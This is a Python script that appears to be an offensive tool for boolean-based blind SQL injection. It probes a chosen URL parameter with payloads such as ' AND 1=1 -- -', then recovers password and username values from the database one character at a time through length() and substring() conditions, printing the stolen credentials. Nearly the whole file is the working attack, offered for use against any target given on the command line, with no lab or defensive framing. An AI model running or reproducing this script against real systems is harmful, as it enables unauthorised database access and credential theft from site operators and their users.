import difflib
import requests
import string
import argparse

# TODO:
#   Add a function to remove the apostrophe in the extraction payloads when not needed
#   Add database and table enumeration

charset = string.ascii_letters + string.digits + string.punctuation

headers = {
    "User-Agent": "Mozilla/5.0"
}

PAYLOADS = [
    "' AND 1=1 -- -",
    "' AND 1=0 -- -",
    # Now for some without an apostrophe
    " AND 1=1 -- -",
    " AND 1=0 -- -"
]

def check_difference(baseline_text, new_text):
    diff = difflib.Differ()
    difference = list(diff.compare(list(baseline_text), list(new_text)))

    return difference

def is_page_different(difference_list):
    for line in difference_list:
        if line.startswith("+ ") or line.startswith("- "):
            return True

    return False

def test_for_sqli(target, param="id", value="1"):
    BASELINE = requests.get(target, headers=headers)
    baseline_text = BASELINE.text

    for payload in PAYLOADS:
        response = requests.get(target, headers=headers, params={param: f"{value}{payload}"})
        new_text = response.text
        difference_list = check_difference(baseline_text, new_text)
        if is_page_different(difference_list):
            print(f"[+] Page is vulnerable to SQL injection with payload: {payload}")
            return True

    print("[-] Page is not vulnerable to SQL injection...")
    return False

def test_condition(payload, target, param="id", value="1"):
    # Get response for the condition we're testing
    response = requests.get(target, headers=headers, params={param: f"{value}{payload}"})
    test_text = response.text

    # Get response for a known FALSE condition
    false_payload = "' AND 1=0 -- -"
    false_response = requests.get(target, headers=headers, params={param: f"{value}{false_payload}"})
    false_text = false_response.text

    # Get response for a known TRUE condition
    true_payload = "' AND 1=1 -- -"
    true_response = requests.get(target, headers=headers, params={param: f"{value}{true_payload}"})
    true_text = true_response.text

    # Compare test response to false response
    diff_with_false = check_difference(false_text, test_text)
    is_different_from_false = is_page_different(diff_with_false)

    # Compare test response to true response
    diff_with_true = check_difference(true_text, test_text)
    is_different_from_true = is_page_different(diff_with_true)

    # If test response is different from false but similar to true, condition is TRUE
    if is_different_from_false and not is_different_from_true:
        return True

    return False

def find_password_length(value, param, target):
    for length in range(1, 1024):
        payload = f"' AND length(password)={length} -- -"
        print(f"[+] Testing on {target}?{param}={value}{payload}")
        result = test_condition(payload, target, param, value)

        if result:
            print(f"[+] Password length: {length}")
            return length

    return None

def find_username_length(value, param, target):
    for length in range(1, 1024):
        payload = f"' AND length(username)={length} -- -"
        print(f"[+] Testing on {target}?{param}={value}{payload}")
        result = test_condition(payload, target, param, value)

        if result:
            print(f"[+] Username length: {length}")
            return length

    return None

def find_character(value, position, target, param="id", field="password"):
    for char in charset:
        payload = f"' AND substring({field},{position},1)='{char}' -- -"
        print(f"[+] Testing condition on {target}?{param}={value}{payload}")
        result = test_condition(payload, target, param, value)

        if result:
            print(f"[+] Position {position}: {char}")
            return char

        print(f"[-] Tried {char}")

    return None

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", required=True)
    parser.add_argument("--value", required=True)
    parser.add_argument("--param", default="id")
    args = parser.parse_args()

    TARGET = args.target
    VALUE = args.value
    PARAM = args.param

    if test_for_sqli(TARGET, PARAM, VALUE):
        print("[+] Continuing with exploitation...")
    else:
        print("[-] Target is not vulnerable to SQL injection!")
        return

    username = ""
    password = ""

    pass_length = find_password_length(VALUE, PARAM, TARGET)
    if pass_length is None:
        print("[-] Could not determine password length!")
        return

    for position in range(1, pass_length + 1):
        char = find_character(VALUE, position, TARGET, PARAM, "password")

        if char is None:
            break

        password += char
        print(f"[+] Password so far: {password}")

    user_length = find_username_length(VALUE, PARAM, TARGET)
    if user_length is None:
        print("[-] Could not determine username length!")
        return
    
    for position in range(1, user_length + 1):
        char = find_character(VALUE, position, TARGET, PARAM, "username")
        username += char
        print(f"[+] Username so far: {username}")

    print(f"[+] Username: {username}")
    print(f"[+] Password: {password}")

if __name__ == "__main__":
    main()
